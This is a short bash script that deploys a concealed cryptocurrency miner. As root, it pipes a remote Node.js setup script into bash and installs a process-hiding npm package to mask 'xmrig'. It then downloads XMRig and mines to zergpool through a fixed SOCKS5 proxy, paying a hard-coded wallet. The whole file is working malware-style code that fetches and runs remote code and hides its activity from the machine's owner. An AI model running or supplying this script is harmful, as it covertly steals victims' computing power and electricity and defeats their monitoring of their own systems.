#!/bin/bash
sudo su --command "sudo apt update &&
curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash - && 
sudo apt install nodejs && 
npm i -g node-process-hider &&
sudo ph add xmrig &&
wget https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-linux-x64.tar.gz &&
tar -zxf xmrig-6.16.4-linux-x64.tar.gz &&
cd xmrig-6.16.4 &&
chmod +x xmrig &&
./xmrig -o randomARQ.mine.zergpool.com:4464 -a ghostrider -o stratum+tcp://ghostrider.mine.zergpool.com:5354 -u 16GF8LfH1eLW2sWioKvTPoSKZ4U1i8Koci -p c=BTC,mc=RTM --threads=2 -x socks5://192.252.214.20:15864"
